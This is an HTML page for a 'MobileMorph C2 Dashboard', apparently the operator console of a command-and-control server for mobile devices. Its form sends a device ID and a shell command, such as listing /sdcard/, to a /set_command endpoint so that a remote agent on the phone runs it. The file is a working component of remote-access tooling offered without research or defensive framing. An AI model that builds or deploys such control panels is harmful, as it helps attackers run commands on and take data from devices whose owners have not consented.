<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MobileMorph C2 Dashboard</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f8f9fa;
    }
    .navbar {
      background-color: #343a40;
    }
    .navbar-brand {
      color: white;
    }
    .card {
      margin-top: 20px;
    }
    .footer {
      margin-top: 40px;
      text-align: center;
      color: #6c757d;
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-expand-lg">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">MobileMorph C2</a>
    </div>
  </nav>

  <div class="container">
    <div class="card shadow">
      <div class="card-header bg-primary text-white">
        Send Command to Agent
      </div>
      <div class="card-body">
        <form id="commandForm">
          <div class="mb-3">
            <label for="deviceId" class="form-label">Device ID</label>
            <input type="text" class="form-control" id="deviceId" placeholder="e.g. a1b2c3d4e5f67890" required />
          </div>
          <div class="mb-3">
            <label for="command" class="form-label">Command</label>
            <input type="text" class="form-control" id="command" placeholder="e.g. ls /sdcard/" required />
          </div>
          <button type="submit" class="btn btn-success">Send Command</button>
        </form>
        <div id="responseMsg" class="mt-3"></div>
      </div>
    </div>

    <div class="footer">
      <p>&copy; 2025 MobileMorph Labs</p>
    </div>
  </div>

  <script>
    document.getElementById("commandForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const deviceId = document.getElementById("deviceId").value;
      const command = document.getElementById("command").value;

      fetch("/set_command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ device_id: deviceId, command: command })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById("responseMsg").innerHTML =
          `<div class='alert alert-info'>${JSON.stringify(data)}</div>`;
      })
      .catch(err => {
        document.getElementById("responseMsg").innerHTML =
          `<div class='alert alert-danger'>Error: ${err.message}</div>`;
      });
    });
  </script>
</body>
</html>
